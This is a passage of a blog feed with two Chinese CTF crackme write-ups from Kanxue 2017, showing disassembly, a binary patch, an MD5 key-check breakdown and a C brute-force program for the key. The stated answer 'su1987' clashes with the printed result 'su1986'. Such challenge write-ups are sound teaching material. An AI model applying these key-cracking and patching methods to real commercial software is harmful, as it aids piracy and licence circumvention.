//</div></pre></td></tr></table></figure> <p>最后KeyMd53与888aeda4ab比较，成功提示Success^^！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">if ( _mbsicmp(keymd5str_obj, a888aeda4ab) ) // 888aeda4ab</div><div class="line">    &#123;</div><div class="line">      CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</div><div class="line">      CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</div><div class="line">      f_UpdateData_41A4F7(0);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      f_ShowSuccess_402030(v1);//成功提示</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>总结算法：</p> <ol> <li>KEY1 = rev(lwr(key))，key长度6，将输入转小写，逆序</li> <li>反调试成功时KEY1[0]+=1, 其他KEY1[i]+=i;</li> <li>KEY2 = DrvMd5(KEY1)，驱动MD5计算</li> <li>KEY3 = Md5(KEY2), 应用层Md5计算</li> <li>KEY4 = KEY3[2:12]，取第3位开始的10个字符</li> <li>KEY4 == ‘888aeda4ab’</li> </ol> <h1 id="11-求解"><a href="#11-求解" class="headerlink" title="11. 求解"></a>11. 求解</h1><p>由于MD5hash无法逆运算，只能爆破了，刚开始忘了题目key只能是数字和字母，结果我跑了全字符，跑了1天多….没出来，卡hi是怀疑自己</p> <p>后来改成了数字字母，终于得到答案 su1987</p> <p>爆破代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div></pre></td><td class="code"><pre><div class="line">char Seed[/*68*/36] = &#123;</div><div class="line"> &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,</div><div class="line"> &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;,</div><div class="line"> &#125;;</div><div class="line"> </div><div class="line">#define SEED_SIZE 36// 68</div><div class="line"></div><div class="line">typedef struct _THREAD_PARAM</div><div class="line">&#123;</div><div class="line"> int i1;</div><div class="line"> int i2;</div><div class="line"> int i3;</div><div class="line"> int i2_1;</div><div class="line"> int i2_2;</div><div class="line">&#125;TPP, *PTPP;</div><div class="line"></div><div class="line">int g_ThreadCnt = 0;</div><div class="line">int g_start = 0;</div><div class="line">long g_count = 0;</div><div class="line"></div><div class="line">void write_file(char* sz)</div><div class="line">&#123;</div><div class="line"> HANDLE hFile = CreateFileA(&quot;1.log&quot;, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</div><div class="line"> if(hFile)</div><div class="line"> &#123;</div><div class="line">  SetFilePointer(hFile, 0, 0, FILE_END);</div><div class="line">  DWORD dw = 0;</div><div class="line">  WriteFile(hFile, sz, strlen(sz), &amp;dw, NULL);</div><div class="line">  CloseHandle(hFile);</div><div class="line">  hFile = NULL;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">bool crack1(PTPP p)</div><div class="line">&#123;</div><div class="line"> int i1 = p-&gt;i1;</div><div class="line"> int i2 = p-&gt;i2;</div><div class="line"></div><div class="line"> char sss[20] = &#123;0&#125;;</div><div class="line"></div><div class="line"> for(int i3=0; i3&lt;SEED_SIZE; i3++)</div><div class="line"> &#123;</div><div class="line">  for(int i4=0; i4&lt;SEED_SIZE; i4++)</div><div class="line">  &#123;</div><div class="line">   for(int i5=0; i5&lt;SEED_SIZE; i5++)</div><div class="line">   &#123;</div><div class="line">    for(int i6=0; i6&lt;SEED_SIZE; i6++)</div><div class="line">    &#123;</div><div class="line">     char sza[7] = &#123;Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i5]&#125;;</div><div class="line"></div><div class="line">     g_count ++;</div><div class="line"></div><div class="line">     char sz[7] = &#123;0&#125;;</div><div class="line">     //反转</div><div class="line">     sz[0] = Seed[i6]+1;</div><div class="line">     sz[1] = Seed[i5]+1;</div><div class="line">     sz[2] = Seed[i4]+2;</div><div class="line">     sz[3] = Seed[i3]+3;</div><div class="line">     sz[4] = Seed[i2]+4;</div><div class="line">     sz[5] = Seed[i1]+5;</div><div class="line"></div><div class="line">     FileMD5 fm;</div><div class="line">     char* p = (char*)fm.md5(sz, 6);</div><div class="line">     p = (char*)fm.md5(p, 32);</div><div class="line">     strncpy(sss, p+2, 10);</div><div class="line"></div><div class="line"></div><div class="line">     if(!stricmp(sss, &quot;888aeda4ab&quot;))</div><div class="line">     &#123;</div><div class="line">      char info[1024] = &#123;0&#125;;</div><div class="line">      sprintf(info, &quot;%c%c%c%c%c%c, =&gt; %s，%s\n&quot;, </div><div class="line">       Seed[i1], Seed[i2], Seed[i3], Seed[i4], Seed[i5], Seed[i6], </div><div class="line">       sz,</div><div class="line">       sss</div><div class="line">       );</div><div class="line">      write_file(info);</div><div class="line"></div><div class="line">     </div><div class="line"></div><div class="line">      int spell = GetTickCount() - g_start;</div><div class="line">      printf(&quot;spell time : %d s&quot;, spell/1000);</div><div class="line"></div><div class="line">      system(&quot;pause&quot;);</div><div class="line"></div><div class="line">      return true;</div><div class="line">     &#125;       </div><div class="line">    &#125;</div><div class="line">   &#125;</div><div class="line">   //system(&quot;cls&quot;);</div><div class="line">   printf(&quot;count: %ld\n&quot;, g_count);</div><div class="line">  &#125;</div><div class="line"></div><div class="line"> &#125;</div><div class="line"></div><div class="line"> return false;</div><div class="line">&#125;</div><div class="line">void crack3(PTPP p)</div><div class="line">&#123;</div><div class="line"> int i1 = p-&gt;i1;</div><div class="line"> int i2_1 = p-&gt;i2_1;</div><div class="line"> int i2_2 = p-&gt;i2_2;</div><div class="line"></div><div class="line"> delete[] p;</div><div class="line"></div><div class="line"> TPP p1 = &#123;0&#125;;</div><div class="line"> p1.i1 = i1;</div><div class="line"> for(int i=i2_1; i&lt;i2_2; i++)</div><div class="line"> &#123;</div><div class="line">  p1.i2 = i;</div><div class="line">  if(crack1(&amp;p1))</div><div class="line">  &#123;</div><div class="line">   return;</div><div class="line">  &#125;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">void crack2(int i1, int i2_1, int i2_2)</div><div class="line">&#123;</div><div class="line"> PTPP p = new TPP;//&#123;0&#125;;</div><div class="line"> if(p == NULL)</div><div class="line"> &#123;</div><div class="line">  printf(&quot;!!!!!!!!!!!!没neicun！！&quot;);</div><div class="line">  return;</div><div class="line"> &#125;</div><div class="line"> memset(p, 0, sizeof(TPP));</div><div class="line"> p-&gt;i1 = i1;</div><div class="line"> p-&gt;i2_1 = i2_1;</div><div class="line"> p-&gt;i2_2 = i2_2;</div><div class="line"> </div><div class="line"> HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)crack3, (PVOID)p, 0, NULL);</div><div class="line"> if(h == NULL)</div><div class="line"> &#123;</div><div class="line">  printf(&quot;CreateTHREAD error [%d]\n&quot;, g_ThreadCnt);</div><div class="line"> &#125;</div><div class="line"> else</div><div class="line"> &#123;</div><div class="line">  g_Handles[g_ThreadCnt++] = h;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void crack()</div><div class="line">&#123;</div><div class="line"> for(int i1=0; i1&lt;SEED_SIZE; i1++)</div><div class="line"> &#123;</div><div class="line">  int i2 = 0;</div><div class="line">#define STEP_SIZE 2</div><div class="line">  for(i2 = 0; i2&lt;SEED_SIZE-STEP_SIZE; i2+=STEP_SIZE)</div><div class="line">  &#123;</div><div class="line">   crack2(i1, i2, i2+STEP_SIZE);</div><div class="line">  &#125;</div><div class="line">  crack2(i1, i2, SEED_SIZE);</div><div class="line"> &#125;</div><div class="line">&#125; </div><div class="line"></div><div class="line">int _tmain(int argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line"> int start = GetTickCount();</div><div class="line"> g_start = GetTickCount();</div><div class="line"></div><div class="line"> crack();</div><div class="line"></div><div class="line"> WaitForMultipleObjects(g_ThreadCnt, g_Handles, TRUE, INFINITE);</div><div class="line"></div><div class="line"> int spell = GetTickCount() - start;</div><div class="line"> printf(&quot;spell time : %d s, thread-count: %d\n&quot;, spell, g_ThreadCnt);</div><div class="line"></div><div class="line"> getchar();</div><div class="line"></div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>最后结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su1986, =&gt; 79;4yx，888aeda4ab</div></pre></td></tr></table></figure></p> <p>由于算法开始有转小写，所以其时答案中所有字母都可以是大小写选择，答案不唯一。</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup5">https://anhkgg.github.io/kxctf2017-writeup5</a></p> ]]></content>          <summary type="html">            &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-35.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ctf.pediy.com/game-fight-35.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;本题需要在XP系统运行，因为驱动只支持xp&lt;/p&gt; &lt;/blockquote&gt; &lt;h1 id=&quot;00-先看驱动&quot;&gt;&lt;a href=&quot;#00-先看驱动&quot; class=&quot;headerlink&quot; title=&quot;00. 先看驱动&quot;&gt;&lt;/a&gt;00. 先看驱动&lt;/h1&gt;&lt;p&gt;驱动不大，才20多个函数。&lt;/p&gt; &lt;p&gt;从入口开始分析。&lt;/p&gt; &lt;h2 id=&quot;1-创建设备&quot;&gt;&lt;a href=&quot;#1-创建设备&quot; class=&quot;headerlink&quot; title=&quot;1. 创建设备&quot;&gt;&lt;/a&gt;1. 创建设备&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &amp;quot;\\device\\vmxdrv&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000107DD 33 FF                                                           xor     edi, edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000107DF 50                                                              push    eax             ; DestinationString&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>        </entry>      <entry>     <title>看雪CTF2017第二题lelfeiCM的writeup</title>     <link href="https://anhkgg.github.io/kxctf2017_writeup2/"/>     <id>https://anhkgg.github.io/kxctf2017_writeup2/</id>     <published>2017-06-11T00:36:27.000Z</published>     <updated>2017-06-14T01:45:43.027Z</updated>          <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-32.htm" target="_blank" rel="external">http://ctf.pediy.com/game-fight-32.htm</a>，可下载相关文件</p> <h1 id="0-定位算法位置"><a href="#0-定位算法位置" class="headerlink" title="0. 定位算法位置"></a>0. 定位算法位置</h1><p>由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.data:00409058 aWellDone       db &apos;WELL DONE!&apos;,0Ah,0   ; DATA XREF: _main:loc_401257o</div><div class="line">.data:00409064 aWrongKey___    db &apos;WRONG KEY...&apos;,0Ah,0 ; DATA XREF: _main+231o</div><div class="line">.data:00409072                 align 4</div><div class="line">.data:00409074 aKeyFormatError db &apos;key format error...&apos;,0Ah,0 ; DATA XREF: _main+9Ao</div></pre></td></tr></table></figure></p> <a id="more"></a> <p>其实就在main函数中，然后看获取输入之后干了什么。<br>首先检查输入长度是不是在8到20之间，不是提示key len error<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00401066                 cmp     ecx, 8</div><div class="line">.text:00401069                 jl      loc_40127A</div><div class="line">.text:0040106F                 cmp     ecx, 14h</div><div class="line">.text:00401072                 jg      loc_40127A</div><div class="line">.text:00401078                 xor     esi, esi</div><div class="line">.text:0040107A                 xor     edx, edx</div><div class="line">.text:0040107C                 test    ecx, ecx</div></pre></td></tr></table></figure></p> <p>是不是都是数值，不是就提示key format error…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">.text:00401082                 jle     short loc_4010AC</div><div class="line">.text:00401084</div><div class="line">.text:00401084 loc_401084:                             ; CODE XREF: _main+94j</div><div class="line">.text:00401084                 mov     al, [esp+edx+4138h+key]</div><div class="line">.text:00401088                 cmp     al, 30h</div><div class="line">.text:0040108A                 jle     short loc_401090</div><div class="line">.text:0040108C                 cmp     al, 39h</div><div class="line">.text:0040108E                 jle     short loc_401091</div><div class="line">.text:00401090</div><div class="line">.text:00401090 loc_401090:                             ; CODE XREF: _main+8Aj</div><div class="line">.text:00401090                 inc     esi</div><div class="line">.text:00401091</div><div class="line">.text:00401091 loc_401091:                             ; CODE XREF: _main+8Ej</div><div class="line">.text:00401091                 inc     edx</div><div class="line">.text:00401092                 cmp     edx, ecx</div><div class="line">.text:00401094                 jl      short loc_401084</div><div class="line">.text:00401096                 test    esi, esi</div><div class="line">.text:00401098                 jz      short loc_4010AC</div><div class="line">.text:0040109A                 push    offset aKeyFormatError ; &quot;key format error...\n&quot;</div><div class="line">.text:0040109F                 call    f_printf_401BE0</div></pre></td></tr></table></figure></p> <p>下面接着就是算法的重要部分了，一看到下面的函数，就知道有点小类结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.text:004012C0 ; KEY_OBJ1 *__thiscall f_keyobj_init_4012C0(KEY_OBJ1 *this)</div><div class="line">.text:004012C0 f_keyobj_init_4012C0 proc near          ; CODE XREF: _main+B3 p</div><div class="line">.text:004012C0                                         ; f_keyobj_calc_mul_401730+29p ...</div><div class="line">.text:004012C0                 push    esi</div><div class="line">.text:004012C1                 mov     esi, ecx</div><div class="line">.text:004012C3                 mov     dword ptr [esi], offset off_4080C8</div><div class="line">.text:004012C9                 call    ds:GetTickCount</div><div class="line">.text:004012CF                 mov     ecx, esi</div><div class="line">.text:004012D1                 mov     [esi+200Ch], eax</div><div class="line">.text:004012D7                 mov     [esi+2008h], eax</div><div class="line">.text:004012DD                 call    f_keyobj_init_seed1_401A60</div><div class="line">.text:004012E2                 mov     eax, esi</div><div class="line">.text:004012E4                 pop     esi</div><div class="line">.text:004012E5                 retn</div><div class="line">.text:004012E5 f_keyobj_init_4012C0 endp</div></pre></td></tr></table></figure></p> <h1 id="1-算法类结构分析，各类函数的功能分析"><a href="#1-算法类结构分析，各类函数的功能分析" class="headerlink" title="1. 算法类结构分析，各类函数的功能分析"></a>1. 算法类结构分析，各类函数的功能分析</h1><p>先把类结构大致整理出来，方便后续分析</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00000000 KEY_OBJ1        struc ; (sizeof=0x2010) ; XREF: _mainr</div><div class="line">00000000                                         ; f_keyobj_calc_mul_401730r</div><div class="line">00000000 vtable_4080C8   dd ?</div><div class="line">00000004 cur_calc_pos    dd ? //结果长度</div><div class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</div><div class="line">00001008 seed_array_1024 dd 1024 dup(?) //保存序号</div><div class="line">00002008 TickCnt_key_seed dd ?</div><div class="line">0000200C TickCnt1        dd ?</div><div class="line">00002010 KEY_OBJ1        ends</div></pre></td></tr></table></figure> <p>然后就是几个关键函数：</p> <p>1.1 初始化数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.text:00401A60 ; char *__thiscall f_keyobj_init_seed1_401A60(KEY_OBJ1 *this)</div><div class="line">...</div><div class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 //更加GetTickCount获取随机index，用于打乱序号的顺序增加分析难度</div><div class="line">...</div><div class="line">.text:00401ABA                 mov     esi, [ecx]</div><div class="line">.text:00401ABC                 sub     ecx, 4</div><div class="line">.text:00401ABF                 mov     [eax], esi</div><div class="line">.text:00401AC1                 add     eax, 4</div><div class="line">.text:00401AC4                 dec     edx</div></pre></td></tr></table></figure></p> <p>这个地方首先就想到了每次GetTickCount不一样，那么算法怎么保证结果相同呢，便想到肯定跟index顺序无关，后面验证果然是，我就把401A60给patch了一下，然初始化的序号结构没有打乱顺序，保持0-0x3ff，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//nop了00401A8F调用的循环部分                 </div><div class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 </div><div class="line">//这里其实就是seed_array_1024[1023]，不让它倒过来赋值，修改为lea     ecx, [esi+1008h]</div><div class="line">.text:00401AAE                 lea     ecx, [esi+2004h]</div></pre></td></tr></table></figure></p> <p>这样之后，就可以很方便查看数据变换，观察这两个字段即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">00000004 cur_calc_pos    dd ? //结果长度</div><div class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</div></pre></td></tr></table></figure></p> <p>后面所有相关函数中有关index转换的也不用关注，因为他变来变去都是0-0x3ff，就只需要关注具体数据操作了。<br>然后其他函数功能分析也就简单了。<br>下面简单列一下，不做详细说明了（很简单，就是数组操作过来过去的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.text:004014E0 ; int __thiscall f_keyojb_key1_4014E0(void *this, const char *key) //将输入的key保存到seed_array_1024_1 中，字符转为数值，每个值存一个dword</div><div class="line">.text:00401970 ; void __thiscall f_keyobj_key1_s2_401970(KEY_OBJ1 *this) //数值大于10，取余存当前index位置，取商和index+1位置求和保存，其实就是进位处理（后面才醒悟）</div><div class="line">.text:00401730 ; signed int __userpurge f_keyobj_calc_mul_401730@&lt;eax&gt;(int a1@&lt;eax&gt;, int keyobj0@&lt;ecx&gt;, signed int a3)//用a3取商做右位移，a3取余做加法，其实就是做乘法运算</div><div class="line">text:00401840 ; signed int __userpurge f_keyobj_mul2_401840@&lt;eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;ecx&gt;, KEY_OBJ1 *a3)//两个KEY_OBJ做乘法</div></pre></td></tr></table></figure></p> <h1 id="2-醒悟算法究竟是个什么玩意"><a href="#2-醒悟算法究竟是个什么玩意" class="headerlink" title="2. 醒悟算法究竟是个什么玩意"></a>2. 醒悟算法究竟是个什么玩意</h1><p>输入的key关键处理部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">.text:004010E0                 push    9</div><div class="line">.text:004010E2                 lea     ecx, [esp+413Ch+keyobj]</div><div class="line">.text:004010E9                 call    f_keyobj_calc_mul_401730 ;</div><div class="line">...</div><div class="line">.text:0040110B                 lea     eax, [esp+4138h+keyobj1]</div><div class="line">.text:00401112                 lea     ecx, [esp+4138h+keyobj]</div><div class="line">.text:00401119                 push    eax</div><div class="line">.text:0040111A                 mov     byte ptr [esp+413Ch+var_4], 1</div><div class="line">.text:00401122                 call    f_keyobj_mul2_401840</div><div class="line">...</div><div class="line">.text:00401127                 push    9</div><div class="line">.text:00401129                 lea     ecx, [esp+413Ch+keyobj]</div><div class="line">.text:00401130                 mov     esi, eax</div><div class="line">.text:00401132                 call    f_keyobj_calc_mul_401730 ;</div></pre></td></tr></table></figure></p> <p>先前想着输入的key用9做位移，做加法，干么呢…一直绕不清，后来重新看f_keyobj_key1_s2_401970，觉得是进位处理，一下子就灵光了，这是实现乘法运算（1024位的乘法，真实折腾，nb）。<br>这样算法也基本清楚了。<br>key<em>9</em>key<em>9</em>(…) =&gt; result</p> <p>怎么校验的呢？</p> <ol> <li>计算结果长度必须是奇数</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.text:00401154                 call    f_keyobj_curpos_4013A0</div><div class="line">.text:00401159                 and     eax, 80000001h</div><div class="line">.text:0040115E                 jns     short loc_401165</div><div class="line">.text:00401160                 dec     eax</div><div class="line">.text:00401161                 or      eax, 0FFFFFFFEh</div><div class="line">.text:00401164                 inc     eax</div><div class="line">.text:00401165</div><div class="line">.text:00401165 loc_401165:                             ; CODE XREF: _main+15E</div><div class="line">.text:00401165                 cmp     eax, 1</div></pre></td></tr></table></figure> <ol> <li>result[len/2] == key[0]</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.text:00401175                 call    f_keyobj_curpos_4013A0</div><div class="line">.text:0040117A                 sar     eax, 1</div><div class="line">.text:0040117C                 push    eax</div><div class="line">.text:0040117D                 lea     ecx, [esp+413Ch+keyobj]</div><div class="line">.text:00401184                 call    f_keyobj_check1_4013B0</div><div class="line">.text:00401189                 push    0</div><div class="line">.text:0040118B                 lea     ecx, [esp+413Ch+keyobj1]</div><div class="line">.text:00401192                 mov     edi, eax</div><div class="line">.text:00401194                 call    f_keyobj_check1_4013B0</div><div class="line">.text:00401199                 cmp     edi, eax</div><div class="line">.text:0040119B                 lea     ecx, [esp+4138h+keyobj1]</div><div class="line">.text:004011A2                 jnz     short loc_40121C</div></pre></td></tr></table></figure> <ol> <li>高位部分和key相同（跳过比较那个字节）</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.text:004011D0                 lea     ecx, [esp+4144h+keyobj1]</div><div class="line">.text:004011D7                 push    esi</div><div class="line">.text:004011D8                 push    ecx</div><div class="line">.text:004011D9                 lea     ecx, [esp+414Ch+keyobj]</div><div class="line">.text:004011E0                 call    f_keyobj_check2_4013E0</div></pre></td></tr></table></figure> <ol> <li>低位部分和key逆序（跳过比较那个字节）</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">text:004011F6                 lea     edx, [esp+413Ch+keyobj1]</div><div class="line">.text:004011FD                 push    eax</div><div class="line">.text:004011FE                 push    1</div><div class="line">.text:00401200                 push    0</div><div class="line">.text:00401202                 push    edx</div><div class="line">.text:00401203                 lea     ecx, [esp+414Ch+keyobj]</div><div class="line">.text:0040120A                 call    f_keyobj_check2_4013E0</div></pre></td></tr></table></figure> <p>感觉结果应该是这一个样子的：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1234567-&gt;1234567654321 